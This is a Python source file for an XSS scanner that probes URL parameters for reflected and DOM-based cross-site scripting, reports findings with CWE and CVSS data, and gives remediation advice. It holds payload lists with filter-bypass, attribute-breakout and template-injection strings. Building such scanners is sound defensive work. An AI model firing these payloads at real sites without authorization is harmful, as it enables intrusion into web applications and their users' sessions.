# scanner/xss/xss.py
"""Cross-Site Scripting (XSS) Scanner"""

import re
import html
from typing import List, Dict, Optional
import aiohttp
from urllib.parse import quote

from ..base import BaseScanner, Vulnerability, Severity, OWASPCategory


class XSSScanner(BaseScanner):
    """Comprehensive Cross-Site Scripting vulnerability scanner"""
    
    name = "XSS Scanner"
    description = "Detects reflected, stored, and DOM-based XSS vulnerabilities"
    owasp_category = OWASPCategory.A03_INJECTION
    
    # Unique identifier for reflection detection
    XSS_CANARY = "VuLnFlOw"
    
    # XSS payloads organized by context
    BASIC_PAYLOADS = [
        # Script tags
        f'<script>alert("{XSS_CANARY}")</script>',
        f'<script>alert(\'{XSS_CANARY}\')</script>',
        f'<script>alert({XSS_CANARY})</script>',
        f'<script>alert`{XSS_CANARY}`</script>',
        f'<script src="http://xss.{XSS_CANARY}.com/x.js"></script>',
        
        # Event handlers
        f'<img src=x onerror="alert(\'{XSS_CANARY}\')">',
        f'<img src=x onerror=alert("{XSS_CANARY}")>',
        f'<img/src=x onerror=alert({XSS_CANARY})>',
        f'<svg onload="alert(\'{XSS_CANARY}\')">',
        f'<svg/onload=alert("{XSS_CANARY}")>',
        f'<body onload="alert(\'{XSS_CANARY}\')">',
        f'<input onfocus="alert(\'{XSS_CANARY}\')" autofocus>',
        f'<marquee onstart="alert(\'{XSS_CANARY}\')">',
        f'<video><source onerror="alert(\'{XSS_CANARY}\')">',
        f'<audio src=x onerror="alert(\'{XSS_CANARY}\')">',
        f'<details open ontoggle="alert(\'{XSS_CANARY}\')">',
        
        # Breaking out of attributes
        f'" onmouseover="alert(\'{XSS_CANARY}\')"',
        f"' onmouseover='alert(\"{XSS_CANARY}\")'",
        f'" onfocus="alert(\'{XSS_CANARY}\')" autofocus="',
        f"' onfocus='alert(\"{XSS_CANARY}\")' autofocus='",
        f'"><script>alert("{XSS_CANARY}")</script>',
        f"'><script>alert('{XSS_CANARY}')</script>",
        f'"><img src=x onerror="alert(\'{XSS_CANARY}\')">',
        f"'><img src=x onerror='alert(\"{XSS_CANARY}\")'>",
        
        # Breaking out of tags
        f'</title><script>alert("{XSS_CANARY}")</script>',
        f'</textarea><script>alert("{XSS_CANARY}")</script>',
        f'</style><script>alert("{XSS_CANARY}")</script>',
        f'</script><script>alert("{XSS_CANARY}")</script>',
        
        # JavaScript context
        f"'-alert('{XSS_CANARY}')-'",
        f'"-alert("{XSS_CANARY}")-"',
        f"';alert('{XSS_CANARY}');//",
        f'";alert("{XSS_CANARY}");//',
        f"\\'-alert('{XSS_CANARY}')-\\'",
        
        # Template injection (Angular, Vue, etc.)
        f'{{{{{XSS_CANARY}}}}}',  # Angular/Vue
        f'${{alert("{XSS_CANARY}")}}',  # Template literals
        f'{{{7*7}}}',  # Math check for template injection
        f'{{{{constructor.constructor("alert(\'{XSS_CANARY}\')")()}}}}',  # Angular sandbox bypass
    ]
    
    # Encoded payloads for filter bypass
    ENCODED_PAYLOADS = [
        # HTML entities
        f'&lt;script&gt;alert("{XSS_CANARY}")&lt;/script&gt;',
        f'&#60;script&#62;alert("{XSS_CANARY}")&#60;/script&#62;',
        f'&#x3C;script&#x3E;alert("{XSS_CANARY}")&#x3C;/script&#x3E;',
        
        # URL encoding
        f'%3Cscript%3Ealert("{XSS_CANARY}")%3C/script%3E',
        f'%253Cscript%253Ealert("{XSS_CANARY}")%253C/script%253E',  # Double encoding
        
        # Unicode encoding
        f'<script>\\u0061lert("{XSS_CANARY}")</script>',
        
        # Mixed case
        f'<ScRiPt>alert("{XSS_CANARY}")</ScRiPt>',
        f'<IMG SRC=x OnErRoR=alert("{XSS_CANARY}")>',
        
        # Null bytes and whitespace
        f'<scr\x00ipt>alert("{XSS_CANARY}")</script>',
        f'<script\t>alert("{XSS_CANARY}")</script>',
        f'<script\n>alert("{XSS_CANARY}")</script>',
        f'<script\r>alert("{XSS_CANARY}")</script>',
        
        # Comment bypass
        f'<!--><script>alert("{XSS_CANARY}")//--></script>',
        f'<script>/*</script><script>alert("{XSS_CANARY}")//*/</script>',
    ]
    
    # Payloads for specific contexts
    URL_CONTEXT_PAYLOADS = [
        f'javascript:alert("{XSS_CANARY}")',
        f'javascript:alert("{XSS_CANARY}")//',
        f'data:text/html,<script>alert("{XSS_CANARY}")</script>',
        f'data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=',
        f'vbscript:alert("{XSS_CANARY}")',  # IE
    ]
    
    # DOM-based XSS sinks to check
    DOM_SINKS = [
        'document.write',
        'document.writeln',
        'document.innerHTML',
        'document.outerHTML',
        'document.location',
        'window.location',
        'location.href',
        'location.assign',
        'location.replace',
        'eval(',
        'setTimeout(',
        'setInterval(',
        'Function(',
        '.innerHTML',
        '.outerHTML',
        '.insertAdjacentHTML',
        'jQuery.html(',
        '$.html(',
    ]
    
    async def scan(self, session: aiohttp.ClientSession, 
                   url: str, params: Dict[str, str] = None) -> List[Vulnerability]:
        """Scan for XSS vulnerabilities"""
        vulnerabilities = []
        
        if not params:
            return vulnerabilities
        
        for param_name, param_value in params.items():
            # Test for reflected XSS
            reflected_vuln = await self._test_reflected_xss(
                session, url, params, param_name
            )
            if reflected_vuln:
                vulnerabilities.append(reflected_vuln)
                continue
            
            # Test for DOM-based XSS indicators
            dom_vuln = await self._test_dom_xss(
                session, url, params, param_name
            )
            if dom_vuln:
                vulnerabilities.append(dom_vuln)
        
        return vulnerabilities
    
    async def _test_reflected_xss(self, session: aiohttp.ClientSession,
                                   url: str, params: Dict[str, str],
                                   param_name: str) -> Optional[Vulnerability]:
        """Test for reflected XSS"""
        
        # First, test basic reflection
        canary_params = params.copy()
        canary_params[param_name] = self.XSS_CANARY
        
        try:
            response = await self.make_request(session, "GET", url, params=canary_params)
            if not response:
                return None
            
            body = await response.text()
            
            # Check if canary is reflected
            if self.XSS_CANARY not in body:
                return None  # Not reflected, skip further tests
            
            # Determine the context of reflection
            context = self._determine_context(body, self.XSS_CANARY)
            
        except Exception:
            return None
        
        # Select payloads based on context
        payloads_to_test = self._select_payloads(context)
        
        # Test each payload
        for payload in payloads_to_test:
            test_params = params.copy()
            test_params[param_name] = payload
            
            try:
                response = await self.make_request(session, "GET", url, params=test_params)
                if not response:
                    continue
                
                body = await response.text()
                
                # Check if payload is reflected without proper encoding
                result = self._check_xss_reflection(body, payload)
                
                if result['vulnerable']:
                    return self.create_vulnerability(
                        vuln_type=f"Cross-Site Scripting ({result['type']})",
                        severity=Severity.HIGH,
                        url=url,
                        parameter=param_name,
                        payload=payload,
                        evidence=f"Context: {context}, Payload reflected: {result['evidence'][:200]}",
                        description=f"Reflected XSS vulnerability detected. The application reflects user input in {context} context without proper encoding.",
                        cwe_id="CWE-79",
                        cvss_score=6.1,
                        remediation=self._get_xss_remediation(context),
                        references=[
                            "https://owasp.org/www-community/attacks/xss/",
                            "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html",
                            "https://portswigger.net/web-security/cross-site-scripting"
                        ]
                    )
            except Exception:
                continue
        
        # If we found reflection but no working payload, report potential XSS
        return self.create_vulnerability(
            vuln_type="Potential XSS (Input Reflection)",
            severity=Severity.MEDIUM,
            url=url,
            parameter=param_name,
            payload=self.XSS_CANARY,
            evidence=f"Input reflected in {context} context. May be vulnerable with proper payload.",
            description=f"The application reflects user input in {context} context. While no working XSS payload was confirmed, this indicates potential vulnerability.",
            cwe_id="CWE-79",
            cvss_score=4.3,
            remediation=self._get_xss_remediation(context),
            references=[
                "https://owasp.org/www-community/attacks/xss/"
            ]
        )
    
    def _determine_context(self, body: str, canary: str) -> str:
        """Determine the HTML context where input is reflected"""
        
        # Find position of canary
        pos = body.find(canary)
        if pos == -1:
            return "unknown"
        
        # Get surrounding context
        start = max(0, pos - 100)
        end = min(len(body), pos + len(canary) + 100)
        context_str = body[start:end]
        
        # Check various contexts
        
        # Inside script tag
        if re.search(r'<script[^>]*>.*' + re.escape(canary), context_str, re.IGNORECASE | re.DOTALL):
            return "javascript"
        
        # Inside event handler
        if re.search(r'on\w+\s*=\s*["\'][^"\']*' + re.escape(canary), context_str, re.IGNORECASE):
            return "event_handler"
        
        # Inside href/src attribute
        if re.search(r'(href|src|action|formaction)\s*=\s*["\'][^"\']*' + re.escape(canary), context_str, re.IGNORECASE):
            return "url_attribute"
        
        # Inside style attribute/tag
        if re.search(r'(style\s*=\s*["\'][^"\']*|<style[^>]*>.*?)' + re.escape(canary), context_str, re.IGNORECASE | re.DOTALL):
            return "css"
        
        # Inside attribute value (double quotes)
        if re.search(r'=\s*"[^"]*' + re.escape(canary) + r'[^"]*"', context_str):
            return "attribute_double"
        
        # Inside attribute value (single quotes)
        if re.search(r"=\s*'[^']*" + re.escape(canary) + r"[^']*'", context_str):
            return "attribute_single"
        
        # Inside HTML tag
        if re.search(r'<[^>]+' + re.escape(canary), context_str):
            return "tag"
        
        # Inside HTML comment
        if re.search(r'<!--.*' + re.escape(canary) + r'.*-->', context_str, re.DOTALL):
            return "comment"
        
        # Default: HTML body
        return "html_body"
    
    def _select_payloads(self, context: str) -> List[str]:
        """Select appropriate payloads based on context"""
        
        if context == "javascript":
            # JavaScript context - focus on breaking out
            return [p for p in self.BASIC_PAYLOADS if any(x in p for x in ["'-", '"-', "';", '";', '</script>'])]
        
        elif context == "event_handler":
            # Event handler - focus on completing the handler
            return [p for p in self.BASIC_PAYLOADS if any(x in p for x in ["alert(", "'-", '"-'])]
        
        elif context == "url_attribute":
            # URL context - focus on javascript: URLs
            return self.URL_CONTEXT_PAYLOADS + [p for p in self.BASIC_PAYLOADS if 'javascript:' in p]
        
        elif context in ["attribute_double", "attribute_single"]:
            # Attribute context - focus on breaking out
            return [p for p in self.BASIC_PAYLOADS if any(x in p for x in ['" ', "' ", '"><', "'><"])]
        
        else:
            # HTML body or unknown - try everything
            return self.BASIC_PAYLOADS + self.ENCODED_PAYLOADS[:5]
    
    def _check_xss_reflection(self, body: str, payload: str) -> Dict:
        """Check if XSS payload is reflected in a dangerous way"""
        
        result = {
            'vulnerable': False,
            'type': 'Reflected',
            'evidence': ''
        }
        
        # Direct reflection (no encoding)
        if payload in body:
            result['vulnerable'] = True
            result['evidence'] = payload
            return result
        
        # Check for partial reflection (script tag present)
        if '<script' in payload.lower():
            if '<script' in body.lower() and self.XSS_CANARY in body:
                result['vulnerable'] = True
                result['type'] = 'Reflected (Script Tag)'
                result['evidence'] = f"Script tag reflected with canary"
                return result
        
        # Check for event handler reflection
        event_patterns = [
            r'on\w+\s*=\s*["\']?[^"\']*alert\s*\(',
            r'on\w+\s*=\s*["\']?[^"\']*' + re.escape(self.XSS_CANARY),
        ]
        
        for pattern in event_patterns:
            if re.search(pattern, body, re.IGNORECASE):
                result['vulnerable'] = True
                result['type'] = 'Reflected (Event Handler)'
                result['evidence'] = f"Event handler with payload"
                return result
        
        # Check for img/svg tag reflection
        if re.search(r'<(img|svg|body|input)[^>]*on\w+\s*=', body, re.IGNORECASE):
            if self.XSS_CANARY in body:
                result['vulnerable'] = True
                result['type'] = 'Reflected (Tag Injection)'
                result['evidence'] = "HTML tag with event handler"
                return result
        
        return result
    
    async def _test_dom_xss(self, session: aiohttp.ClientSession,
                            url: str, params: Dict[str, str],
                            param_name: str) -> Optional[Vulnerability]:
        """Test for DOM-based XSS indicators"""
        
        try:
            response = await self.make_request(session, "GET", url, params=params)
            if not response:
                return None
            
            body = await response.text()
            
            # Check for DOM sinks with potential sources
            dangerous_patterns = []
            
            for sink in self.DOM_SINKS:
                # Check if sink is used with location/document data
                patterns = [
                    rf'{re.escape(sink)}.*location\.',
                    rf'{re.escape(sink)}.*document\.(URL|documentURI|referrer)',
                    rf'{re.escape(sink)}.*window\.name',
                    rf'{re.escape(sink)}.*\$_GET',
                    rf'location\.[^=]*=.*{re.escape(sink)}',
                ]
                
                for pattern in patterns:
                    if re.search(pattern, body, re.IGNORECASE):
                        dangerous_patterns.append(f"{sink} with user-controlled source")
            
            if dangerous_patterns:
                return self.create_vulnerability(
                    vuln_type="Potential DOM-based XSS",
                    severity=Severity.MEDIUM,
                    url=url,
                    parameter=param_name,
                    payload=None,
                    evidence=f"Dangerous patterns found: {', '.join(dangerous_patterns[:3])}",
                    description="The page contains JavaScript code that may be vulnerable to DOM-based XSS. Dangerous sinks are used with potentially user-controlled sources.",
                    cwe_id="CWE-79",
                    cvss_score=5.4,
                    remediation=self._get_xss_remediation('dom'),
                    references=[
                        "https://owasp.org/www-community/attacks/DOM_Based_XSS",
                        "https://portswigger.net/web-security/cross-site-scripting/dom-based"
                    ]
                )
                
        except Exception:
            pass
        
        return None
    
    def _get_xss_remediation(self, context: str) -> str:
        """Get context-specific XSS remediation advice"""
        
        base_remediation = """
General XSS Prevention:
1. Encode output based on context (HTML, JavaScript, URL, CSS)
2. Use Content-Security-Policy headers
3. Set HttpOnly and Secure flags on cookies
4. Use modern frameworks with built-in XSS protection
5. Validate and sanitize input (defense in depth)
6. Use template engines that auto-escape by default
"""
        
        context_specific = {
            'html_body': """
HTML Body Context:
- HTML encode: < > & " '
- Use textContent instead of innerHTML
- Example: element.textContent = userInput;
""",
            'javascript': """
JavaScript Context:
- JSON encode data inserted into JS
- Use textContent for DOM manipulation
- Avoid eval(), setTimeout with strings, Function()
- Example: JSON.stringify(userInput)
""",
            'attribute_double': """
Attribute (Double Quote) Context:
- HTML encode and escape double quotes
- Encode: < > & "
- Example: <div title="{{htmlEncode(userInput)}}">
""",
            'attribute_single': """
Attribute (Single Quote) Context:
- HTML encode and escape single quotes  
- Encode: < > & '
- Example: <div title='{{htmlEncode(userInput)}}'>
""",
            'url_attribute': """
URL Attribute Context:
- URL encode user input
- Validate URL scheme (only allow http/https)
- Example: <a href="{{urlEncode(userInput)}}">
- Block javascript:, data:, vbscript: schemes
""",
            'event_handler': """
Event Handler Context:
- Avoid inserting user data into event handlers
- JavaScript encode if absolutely necessary
- Better: Use addEventListener with proper encoding
""",
            'dom': """
DOM-based XSS:
- Avoid dangerous sinks (innerHTML, document.write, eval)
- Use textContent instead of innerHTML
- Sanitize with DOMPurify library
- Validate URLs before using in location assignments
"""
        }
        
        return base_remediation + context_specific.get(context, "")